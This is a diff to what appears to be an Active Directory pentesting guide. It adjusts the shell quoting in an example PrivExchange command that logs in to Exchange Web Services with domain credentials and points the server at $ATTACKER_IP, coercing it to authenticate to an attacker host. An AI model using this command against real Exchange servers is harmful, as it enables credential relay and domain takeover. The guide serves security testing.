@@ -14,7 +14,7 @@ category: ad
 [PrivExchange](https://github.com/dirkjanm/privexchange/) (Python) is a tool able to log in on Exchange Web Services and call that API.
 
 ```bash
-privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET
+privexchange.py -d "$DOMAIN" -u "$DOMAIN_USER" -p "$PASSWORD" -ah "$ATTACKER_IP" "$EXCHANGE_SERVER_TARGET"
 ```
 
 > [!TIP]
